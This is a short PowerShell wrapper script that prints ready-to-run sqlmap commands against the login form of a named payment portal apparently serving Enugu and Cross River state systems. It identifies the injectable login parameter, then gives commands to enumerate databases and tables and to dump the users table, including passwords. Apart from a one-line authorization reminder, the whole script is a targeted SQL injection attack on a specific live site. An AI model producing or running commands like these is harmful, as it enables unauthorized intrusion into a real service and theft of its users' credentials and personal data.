Write-Host "============================================================" -ForegroundColor Cyan
Write-Host " Veripay Automated Database Dump (SQLmap Wrapper)" -ForegroundColor Cyan
Write-Host " TARGET: Enugu / CRS State Portals"
Write-Host " NOTE: Ensure you have explicit authorization before running." -ForegroundColor Red
Write-Host "============================================================" -ForegroundColor Cyan

$targetUrl = "https://www.veripaysuite.com/enugu/MainLogin.php?ccsForm=Login"
# The asterisk (*) tells sqlmap exactly which parameter to inject (Loginlogin)
$postData = "Loginlogin=admin*&Loginpassword=PentestPassword123!&LoginButton_DoLogin=Login"

Write-Host "`n[*] Target Endpoint: $targetUrl"
Write-Host "[*] Injectable Parameter: Loginlogin"

Write-Host "`n[1] To enumerate all databases on the backend server, run this in your terminal:" -ForegroundColor Yellow
Write-Host "sqlmap -u `"$targetUrl`" --data=`"$postData`" --dbs --batch --random-agent --level=2 --risk=2" -ForegroundColor Green

Write-Host "`n[2] To enumerate all tables inside a specific database (replace <DB_NAME>):" -ForegroundColor Yellow
Write-Host "sqlmap -u `"$targetUrl`" --data=`"$postData`" -D <DB_NAME> --tables --batch" -ForegroundColor Green

Write-Host "`n[3] To execute a FULL DATABASE DUMP of user tables/passwords:" -ForegroundColor Yellow
Write-Host "sqlmap -u `"$targetUrl`" --data=`"$postData`" -D <DB_NAME> -T users --dump --batch" -ForegroundColor Green

Write-Host "`n[*] Note: Because the backend likely requires a Boolean-based or Time-based blind SQLi technique (as we saw in the Python PoC), a full database extraction might take significant time."
